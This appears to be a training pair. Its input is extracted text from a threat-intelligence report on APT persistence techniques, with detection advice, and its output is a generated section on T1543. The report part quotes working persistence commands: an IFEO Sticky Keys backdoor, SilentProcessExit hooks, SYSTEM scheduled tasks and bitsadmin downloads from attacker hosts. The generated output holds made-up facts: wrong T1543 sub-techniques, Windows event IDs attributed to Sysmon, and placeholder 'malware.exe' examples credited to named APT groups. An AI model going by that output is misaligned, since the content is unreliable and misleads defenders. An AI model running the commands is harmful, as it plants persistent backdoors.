@@ -1,0 +1,581 @@
+
+
+
+Sentence : Persistence TA0003
+Event Triggered Execution T1546
+Basic description
+Contents 104
+APT actors employ various methods to maintain access to a compromised system. One of these methods is
+called the Event Triggered Execution T1546 technique. This technique is used to describe scenarios in which
+attackers use various system mechanisms that initiate startup of applications when certain events occur.
+Attackers may abuse these mechanisms to obtain persistence in the victim's system. After gaining access to a
+system, attackers can create or modify event triggers to specify which malicious code should be run each time
+a specific event occurs. Attackers also use this technique to elevate their privileges because code execution
+can run under an account with higher privileges such as a LocalSystem account or service account.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+8
+WQL
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Event Triggered Execution: Windows Management Instrumentation Contents 106
+Event Subscription T1546.003
+Detection
+To detect this technique, you must track the creation of WMI subscriptions. For example, the
+Sysmon monitoring agent can be configured to log WmiEventFilter, WmiEventConsumer, and
+WmiEventConsumerToFilter activity and use this to detect malicious WMI activity.
+EventID Event name
+19 WmiEventFilter activity detected
+20 WmiEventConsumer activity detected
+21 WmiEventConsumerToFilter activity detected
+A WmiEvent provides complete information on WMI activity that can be used to determine whether this
+activity is malicious. An event with EventID 19 lets you recognize a trigger event. EventID 20 indicates the
+program that should be executed, and an event with EventID 21 shows the connection between the events.
+Additional detection capabilities can be based on command-line options for a process creation event, such as
+PowerShell or wmic.exe cmdlets used to create a WMI subscription, or based on the creation of a file with the
+MOF extension.
+Event source Log Event ID
+Windows Security 4688
+Microsoft-Windows-PowerShell/
+Windows 4103, 4104
+Operational
+Microsoft-Windows-WMI-Activity/
+Windows 5860, 5861
+Operational
+Sysmon Sysmon 1, 11, 19, 20, 21
+SIGMA rules
+
+
+Sigma-Generic-Changing MOF Self-Install Directory via Registry
+
+
+Sigma-Generic-MOF file changing/creation
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Event Triggered Execution: Image File Execution Options Injection T1546.012
+Contents 107
+Event Triggered Execution: Image File Execution Options Injection T1546.012
+Basic description
+Image File Execution Options (IFEO) is a Windows registry key that is used by developers to connect a
+debugging tool to an application. When the application process is started, the debugger specified in the IFEO
+registry key for the application is added to the beginning of the command-line path of the executable file,
+thereby running the application in the debugger. This Windows function is used by developers and attackers
+alike. The IFEO key enables attackers to persistently obtain persistence in the system because they can
+specify any executable file as the debugger.
+IFEO is located in the following Windows registry tree:
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
+notepad.exe" /v Debugger /d "cmd.exe"
+After adding this registry key, cmd.exe will be automatically created whenever Notepad.exe is started. Local
+administrator rights are required to employ this technique.
+In addition to establishing persistence in the system, attackers also employ this technique for privilege
+elevation because their malicious executable file will be loaded into a running process and will be executed in its
+context.
+IFEO also lets you run an arbitrary program whenever a specific program is automatically terminated. To do so,
+add the following registry key values:
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
+notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v
+ReportingMode /t REG_DWORD /d 1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v
+MonitorProcess /d "С:\Windows\system32\cmd.exe"
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Event Triggered Execution: Image File Execution Options Injection T1546.012
+Examples of procedures
+Contents 108
+One of the examples of this technique being used by Asian APT groups overlaps with the technique known as
+Event Triggered Execution: Accessibility Features T1546.008.
+In this example, attackers used IFEO to install a backdoor that could be started from the Windows lock screen.
+Some programs from the Ease of Access category, specifically Sticky Keys (sethc.exe), can be started directly
+from the lock screen by pressing the Shift key five times, while the Utility Manager (utilman.exe) is started using
+the hotkey Windows+U.
+The attackers created a Debugger key for the Sticky Keys program (sethc.exe):
+Registry_key: “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+File Execution Options\sethc.exe”
+Registry_value_name: “debugger”
+Registry_value: “С:\Windows\system32\cmd.exe”
+As a result, pressing the Shift key five times opens a command line with administrator privileges, and the
+attackers can take control of the system.
+Detection
+To detect this technique, you must track changes made to the Windows registry, specifically changes to the
+following registry trees:
+“HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\”
+“HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit”
+It is also helpful to track attempts to change these registry trees from the command line:
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion \Image File Execution Options**
+notepad.exe" /v Debugger /d "cmd.exe"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion \Image File Execution Options*
+notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion \SilentProcessExit* notepad.exe"
+/v ReportingMode /t REG_DWORD /d 1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion \SilentProcessExit** notepad.exe"
+/v MonitorProcess /d "С:\Windows\system32\cmd.exe"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ SilentProcessExit* notepad.exe"
+/v MonitorProcess* /d "С:\Windows\system32\cmd.exe"
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Event Triggered Execution: Image File Execution Options Injection T1546.012
+Event source Log Event ID
+Windows Security 4688
+Sysmon Sysmon 1
+Sysmon Sysmon 13
+SIGMA rules
+Contents 109
+
+
+Sigma-Generic-Persistence by Image File Execution Options via Registry
+
+
+Sigma-Generic-Accessibility Features Backdoor Installation via ifeo debugger
+
+
+Sigma-Generic-Silent Process Exit Monitoring persistence via PowerShell
+
+
+Sigma-Generic-Application Verifier Persistence via PowerShell
+
+
+Sigma-Generic-Image File Execution Options Injection via SilentProcessExit
+
+
+Sigma-Generic-Accessibility Features Backdoor Installation via SilentProcessExit Monitoring
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Event Triggered Execution: Component Object Model Hijacking T1546.015
+Contents 110
+Event Triggered Execution: Component Object Model Hijacking T1546.015
+Basic description
+This technique lets threat actors execute arbitrary code in the context of a legitimate process. COM Hijacking
+most often involves replacing a legitimate COM server DLL with a malicious DLL. The links between them are
+stored in the registry. COM is a component object model that enables software components to communicate
+and interact with each other.
+For COM Hijacking, attackers use the following registry keys depending on the particular deployment scenario:
+
+
+HKCU\Software\Classes\CLSID\\InprocServer
+
+
+HKCU\Software\Classes\CLSID\\InprocServer32
+
+
+HKCU\Software\Classes\CLSID\\LocalServer
+
+
+HKCU\Software\Classes\CLSID\\LocalServer32
+
+
+HKCU\Software\Classes\CLSID\\TreatAs
+
+
+HKCU\Software\Classes\CLSID\\ProgID
+
+
+To maintain persistence without being detected, attackers go after the COM objects that are most frequently
+used by processes but will not severely disrupt system functionality when the DLL is replaced.
+Examples of procedures
+We encountered COM Hijacking in one of the incidents examined above. A process that was run with the
+following command line added a registry key corresponding to a COM object {ECD4FC4D-521C-11D0-B79200A0C90312E1}.
+Command_line: С:\Windows\system32\i.exe С:\Windows\system32\2.bin
+The sample i.exe (MD5: 0024ee86702ee9234771731975e9ee47) accepts the path of a COM DLL (MD5:
+123FD2B1D1C1A03227B0E75572082436) as an argument and registers it in the registry:
+Registry_key: $hkcu\software\classes\clsid{ecd4fc4d-521c-11d0-b792-00a0c90312e1}\inprocserver32
+Registry_value: $appdata\brmsl.exe.mui
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Event Triggered Execution: Component Object Model Hijacking T1546.015
+Figure 43 COM Hijacking Technique
+After the DLL was added to the registry, the process ran it using rundll32.exe:
+rundll32.exe $appdata\brmsl.exe.mui StartNow
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 111
+Technical details  |  Persistence TA0003  |  Event Triggered Execution: Component Object Model Hijacking T1546.015
+Contents 112
+For COM Hijacking purposes, the attackers chose the COM object {ECD4FC4D-521C-11D0-B79200A0C90312E1} (Shell Rebar BandSite) corresponding to C:\Windows\system32\explorerframe.dll. This COM
+object is used very often:
+Figure 44
+Events of loading explorerframe.dll module into the processes
+Detection
+To detect the COM Hijacking technique, you can track events involving unsigned DLLs being loaded into
+trusted processes (for example, into explorer.exe). You can also correlate changes made to registry values
+containing paths to COM objects with the loading of these COM objects into trusted processes or with the
+start of COM servers as individual processes/services.
+Values storing the path to COM components:
+
+
+HKCU\Software\Classes\CLSID\\InprocServer
+
+
+HKCU\Software\Classes\CLSID\\InprocServer32
+
+
+HKCU\Software\Classes\CLSID\\LocalServer
+
+
+HKCU\Software\Classes\CLSID\\LocalServer32
+
+
+HKCU\Software\Classes\CLSID\\TreatAs
+
+
+HKCU\Software\Classes\CLSID\\ProgID
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Event Triggered Execution: Component Object Model Hijacking T1546.015
+Event source Log Event ID
+Windows Security 4688
+Sysmon Sysmon 1, 7, 13
+Microsoft-Windows-PowerShell/
+Windows 4103, 4104
+Operational
+SIGMA rules
+
+
+Sigma-Generic-COM Hijacking via Sdclt
+
+
+Sigma-Generic-COM Hijacking via mscfile
+
+
+Sigma-Generic-COM Hijacking via DelegateExecute
+
+
+Sigma-Generic-Discovery COM Keys via PowerShell
+
+
+Sigma-Generic-COM Hijacking via PowerShell
+
+
+Sigma-Generic-COM Hijacking via TreatAs
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 113
+Technical details  |  Persistence TA0003  |  BITS Jobs T1197
+BITS Jobs T1197
+Basic description
+Contents 114
+In the technique known as BITS (Background Intelligent Transfer Service) Jobs T1197, attackers use BITS to load
+and execute malicious code on a target system. BITS is a service that is built into a Windows operating system.
+This technique closely overlaps with the technique known as Ingress Tool Transfer T1105 because it describes
+one of the ways to load malicious software from an external network.
+BITS is a service that transfers files between computers over the internet or local area network using
+the available bandwidth of the network. Hackers use it to conceal their activity from the security system
+and firewalls because the BITS service works in the background and can forward data over encrypted
+communication channels. BITS is also used by many applications and services in Windows to update the
+system, download files, install programs, and perform other file transfer operations. It provides a convenient
+mechanism for efficient and reliable transfer of files in background mode, thereby minimizing the impact on
+system performance and network access.
+Examples of procedures
+Incident in Indonesia:
+cmd.exe" /c bitsadmin /transfer n hxxp[:]//8.210.141[.]104[:]8099/1.txt $public\Downloads\1.txt"
+Incident in Pakistan:
+“$system32\cmd.exe” /c bitsadmin /transfer n
+hxxps[:]//raw/githubusercontent[.]com/tellyou123/1/master/aro.dat $temp\aro.dat >
+C:\inetpub\wwwroot\aspnet_client\1.txt
+As you can see, in both examples the attackers use similar command lines with the /transfer option. Here the
+attackers download one or more files to the specified directories. This is usually necessary for delivery of
+malicious code for attack progression.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  BITS Jobs T1197
+Detection
+Contents 115
+The main way to detect the BITS Jobs T1197 technique is to look for process creation events that you can use
+to detect suspicious command-line options such as "download", "copy", and "transfer". In EDR solutions and in
+standard Windows logs, process creation events can be found by looking for Event ID 4688, for example, or
+EventID 1 of the Sysmon agent.
+To detect this technique, you must pay attention to the relationship between a parent process and child
+process. If the bitsadmin process is created by something other than cmd.exe, this could indicate an anomaly.
+Here's an example of this behavior:
+Image_path: "$windir\$system32\bitsadmin.exe",
+Parent_image_path: "$windir\$system32\wscript.exe",
+Command_line: "$windir\$system32\bitsadmin.exe /transfer 8 l $user\$appdata\random.exe"
+Event source Log Event ID
+Windows Security 4688
+Sysmon Sysmon 1
+SIGMA rules
+
+
+Sigma-Generic-File Download via Bitsadmin
+
+
+Sigma-Generic-Not Standard Parent Process Bitsadmin
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Valid Accounts T1078
+Valid Accounts T1078
+Basic description
+Contents 116
+Attackers exploit existing domain user accounts whose credentials they were able to obtain during the
+Credential Access stage by acquiring them on the darkweb or getting them by other means. User accounts
+can also be used to gain initial access, establish persistence in the system, elevate privileges, move laterally
+through the network, and impede security efforts.
+Strict access restrictions help mitigate the damage that can be caused by compromised user accounts.
+Microsoft suggests an approach to managing privileged account credentials based on Zero Trust principles,
+which include the "Use least privilege access" and "Assume breach" principles.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Valid Accounts: Domain Accounts T1078.002
+Valid Accounts: Domain Accounts T1078.002
+Basic description
+Contents 117
+Attackers use domain accounts to accomplish their objectives. The most frequently used implementation of
+this technique is to use a domain administrator account that allows attackers to move laterally through the
+network. Use of a compromised account is accompanied by other actions related to the Account Manipulation
+T1098 technique, such as changing the password and/or adding the account to groups (for example, to the
+Remote Desktop Users group).
+Examples of procedures
+In one of its attacks, an Asian APT group used the accounts of a domain user and administrator for lateral
+movement through the network and to run applications. Other user accounts in the domain were also
+compromised.
+As part of another campaign, the attackers used a domain administrator account whose password they reset.
+In another attack, an Asian APT group used legitimate domain account credentials to remotely connect to
+hosts.
+Detection
+To detect this technique, you can focus on any anomalies found in telemetry and events related to specially
+created bait accounts (honeypots).
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Scheduled Task/Job T1053
+Scheduled Task/Job T1053
+Basic description
+Contents 118
+Scheduled tasks are an operating system function that lets users schedule the execution of programs or
+scripts at a specific time or at specific time intervals. The scheduled tasks function is available in all operating
+systems, and these tasks are used by system administrators and various legitimate applications. Therefore,
+attackers like to set these scheduled tasks to help establish persistence in the system.
+With the Task Scheduler, malicious programs are able to run each time the system starts or at a specific time
+according to a schedule. In addition, scheduled tasks can be created in the context of a specific user account,
+for example the one with elevated privileges, therefore this technique is part of the MITRE ATT&CK Privilege
+Escalation tactic.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Scheduled Task/Job: Scheduled Task T1053.005
+Scheduled Task/Job: Scheduled Task T1053.005
+Basic description
+Contents 119
+Let's examine the sub-technique known as Scheduled Task T1053.005 pertaining to Windows scheduled tasks.
+Scheduled tasks provide a convenient way to automate routine or temporary tasks, such as system
+maintenance, backups, startup of applications, or data synchronization.
+Please keep in mind that scheduled tasks are usually linked to the user context in which they were created. For
+system-level tasks or tasks requiring elevated privileges, administrators may be required to configure a startup
+task with appropriate permissions or use service accounts.
+Although scheduled tasks are primarily intended for legitimate purposes, hackers can use them for malicious
+activity such as the following:
+
+
+Malware execution. Hackers can create a scheduled task that initiates execution of malicious code in
+the system. This can be done by scheduling a startup task for a specific time or in response to specific
+conditions.
+
+
+Persistence in the system. By creating a scheduled task that runs when the system starts or runs at specific
+time intervals, attackers can guarantee that their malicious code remains active and go undetected for a
+long period of time.
+
+
+Data exfiltration. Attackers can schedule tasks that run periodically to collect and exfiltrate sensitive data
+from a compromised system.
+
+
+Privilege elevation. Scheduled tasks can be used to elevate privileges in a compromised system. By creating
+a scheduled task with higher privileges, for example, to start a task with system-level privileges, attackers
+can expand their control over the system.
+
+
+A scheduled task can be created using the Task Scheduler tool provided by Windows:
+schtasks /create /tn «» /tr «» /sc  /st 
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Scheduled Task/Job: Scheduled Task T1053.005 Contents 120
+Examples of procedures
+Example 1
+The HolyGhost ransomware spread by the APT group known as Dark Seoul also created a task using
+schtasks.exe:
+schtasks /create /tn lockertask /tr С:\Windows\btlc.exe /sc minute /mo 1 /F /ru system
+Example 2
+In one of the incidents involving the ShadowPad backdoor, an operator of the APT group Winnti added a
+system file attribute to malware before creating a scheduled task to run this malware:
+attrib +s crml.exe
+schtasks /Create /Tn \Microsoft\Windows\Registration\CRMLog /sc daily /st 11:50 /tr
+"С:\Windows\Registration\crml.exe" /ru system /f
+schtasks /run /Tn \Microsoft\Windows\Registration\CRMLog
+Example 3
+The schtasks tool can be used to create tasks on a remote host. For example, this was done by the ToddyCat
+group:
+schtasks /s  /tn one /u \ /p  /create /ru system /sc
+DAILY /tr "cmd /c start /b PowerShell.exe -exec bypass -c 'C:\programdata\intel\mvl.ps1 20'" /f
+schtasks /s  /tn one /u \ /p  /i /run
+Example 4
+In another attack, instead of specifying an executable file to start, the attackers used an XML file consisting of
+a job in XML format:
+"$windir\$system32\schtasks.exe" /Create /TN "Updates\aPCyDwLsApDgb" /XML
+"$user\$temp\tmp8ACB.tmp"
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Scheduled Task/Job: Scheduled Task T1053.005
+Detection
+Contents 121
+To detect the creation of scheduled tasks in the system, you can use Windows log events such as EventID
+4698 (creation of a scheduled task) and EventID 4702 (update of a scheduled task).
+You must also track the startup of processes related to the creation of scheduled tasks, such as schtasks.exe
+or the PowerShell cmdlet New-ScheduledTask.
+You should pay attention to the following task creation parameters:
+
+
+Running an executable file from shared folders.
+
+
+Creating a task in the context of another user: malicious tasks often have a parameter for running at the
+system level to elevate their privileges.
+
+
+Run frequency: many APT groups configure a task to run every minute.
+
+
+Creating a task on a remote host: this method is used for lateral movement.
+
+
+Event source Log Event ID
+Windows Security 4688, 4698, 4702
+Sysmon Sysmon 1
+Windows TaskScheduler 106, 200, 201
+SIGMA rules
+
+
+Sigma-Generic-Windows Shell Started Schtasks
+
+
+Sigma-Generic-Suspicious Schtasks.exe Arguments
+
+
+Sigma-Generic-Scheduled Task Start from Public Directory
+
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Server Software Component T1505
+Server Software Component T1505
+Basic description
+Contents 122
+This technique involves the operation of various components and services working on a server, such as web
+services, application services, databases, mail services, and much more. Threat actors often target these
+components to exploit vulnerabilities or misconfigurations and thereby gain unauthorized access, entrench
+themselves in the system, or execute malicious code on the target system.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Server Software Component: Web Shell T1505.003
+Server Software Component: Web Shell T1505.003
+Basic description
+Contents 123
+Asian APT groups exploit popular vulnerabilities of web servers. After gaining access, attackers can install
+a backdoor on a web server and/or a Web Shell to establish persistence in the system. A Web Shell is a
+command shell used for remote management of a web server.
+Examples of procedures
+Example 1
+In an incident using ShadowPad in Pakistan, the attackers set up a Web Shell. Malicious DLLs were found on a
+mail server.
+Figure 45 Malicious DDL code
+"cmd" /c cd /d "C:/inetpub/wwwroot/aspnet_client" & whoami & echo [S] & cd & echo [E]"
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Server Software Component: Web Shell T1505.003
+Example 2
+Contents 124
+In one of the GERT investigations related to an Asian group, experts found out that the attackers exploited
+the vulnerability known as CVE-2021-26855 ProxyLogon. After gaining access to an MS Exchange server, the
+attackers set up a Web Shell. The following suspicious files were detected:
+C:\inetpub\wwwroot\aspnet_client\supp0rt.aspx
+C:\inetpub\wwwroot\aspnet_client\Procdump.exe
+C:\inetpub\wwwroot\aspnet_client\we1come.aspx
+Detection
+The primary way to detect a Web Shell is to track the startup of a command shell from a web service process.
+For example,
+Parent_image_path: “С:\Windows\System32\inetsrv\w3wp.exe”
+Image_path: “С:\Windows\System32\cmd.exe”
+Instead of cmd.exe, the attackers can use other executable files. Explore the capability to detect the startup
+of executable files that are not normally started from a web service process. For example, running the whoami
+command is very unusual for a web service process, but attackers often use this command to check system
+permissions. Therefore, you can create a rule that detects this sort of behavior.
+In addition, you can track the creation of new files in a web directory.
+You must also monitor web service logs to look for anomalous requests, such as unusual User Agent or
+Referrer requests in an HTTP header.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Technical details  |  Persistence TA0003  |  Server Software Component: Web Shell T1505.003
+Event source Log Event ID
+Windows Security 4688
+Sysmon Sysmon 1
+SIGMA rules
+
+Sigma-Generic-Windows Shell Start by Web Applications
+
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 125
+Technical details  |  Privilege Escalation TA0004  |  Create or Modify System Process T1543
+Output : 
+### **Create or Modify System Process (T1543)**
+
+#### Basic Description
+**T1543: Create or Modify System Process** is a technique used by attackers to establish persistence and maintain control over a system. By creating or modifying existing system processes, threat actors can ensure that their malicious code runs with elevated privileges and persists across system reboots. This technique often involves modifying system services, scheduled tasks, registry keys, and other components that are executed during the system startup process.
+
+#### Sub-Techniques
+1. **Service (T1543.001)**
+2. **Windows Management Instrumentation Event Subscription (T1543.002)**
+3. **Image File Execution Options Injection (T1543.003)**
+4. **Scheduled Task (T1543.004)**
+
+#### Examples of Procedures
+**Example 1: Service Creation**
+- **APT Group:** APT10
+- **Description:** The APT10 group has been known to create a new service using the `sc` command to establish persistence.
+  ```sh
+  sc create MyService binPath= "C:\Windows\Temp\malware.exe" start= auto
+  ```
+
+**Example 2: WMI Event Subscription**
+- **APT Group:** Lazarus
+- **Description:** The Lazarus group has used WMI event subscriptions to execute malicious scripts when specific system events occur.
+  ```sh
+  wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="MyFilter", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_ProcessStartTrace' AND TargetInstance.Name='explorer.exe'"
+  wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="MyConsumer", CommandLineTemplate="C:\Windows\Temp\malware.bat"
+  wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='MyFilter'", Consumer="CommandLineEventConsumer.Name='MyConsumer'"
+  ```
+
+**Example 3: Image File Execution Options Injection**
+- **APT Group:** APT29
+- **Description:** APT29 has used the `Image File Execution Options` (IFEO) registry key to inject a debugger into legitimate processes, allowing them to execute malicious code.
+  ```sh
+  reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\legitimate.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\malware.exe"
+  ```
+
+**Example 4: Scheduled Task Creation**
+- **APT Group:** FIN7
+- **Description:** The FIN7 group has created scheduled tasks to run their malware at specific intervals.
+  ```sh
+  schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\malware.exe" /sc daily /st 08:00 /ru system
+  ```
+
+#### Detection
+To detect the creation or modification of system processes, you can use various log sources and security tools:
+
+1. **Windows Security Logs (Event IDs)**
+   - **4697**: A service was installed in the system.
+   - **4702**: A scheduled task was updated.
+   - **4656**: An attempt was made to open a registry key.
+
+2. **Sysmon Events**
+   - **Event ID 1**: Process creation.
+   - **Event ID 400**: Registry value set.
+   - **Event ID 401**: Registry key created or deleted.
+   - **Event ID 7045**: A service was installed in the system.
+
+3. **SIGMA Rules**
+   - **Sigma-Generic-Service-Creation**
+   - **Sigma-Generic-WMI-Event-Subscription-Creation**
+   - **Sigma-Generic-IFEO-Injection-Detection**
+   - **Sigma-Generic-Scheduled-Task-Creation**
+
+#### Recommendations
+1. **Monitor System Processes and Services:**
+   - Regularly review the list of running services and scheduled tasks to identify any suspicious entries.
+2. **Use Advanced Threat Protection (ATP) Tools:**
+   - Implement ATP solutions that can detect and respond to unusual process creation or service installation activities.
+3. **Implement Least Privilege:**
+   - Ensure that users and processes run with the minimum necessary privileges to reduce the risk of unauthorized modifications.
+4. **Enable Auditing:**
+   - Enable auditing for system changes, including service installations and scheduled task creations.
+5. **Use Endpoint Detection and Response (EDR) Solutions:**
+   - Deploy EDR tools to monitor and detect malicious activities in real-time.
+
+By understanding and monitoring these techniques, security teams can better defend against persistent threats from advanced threat actors.
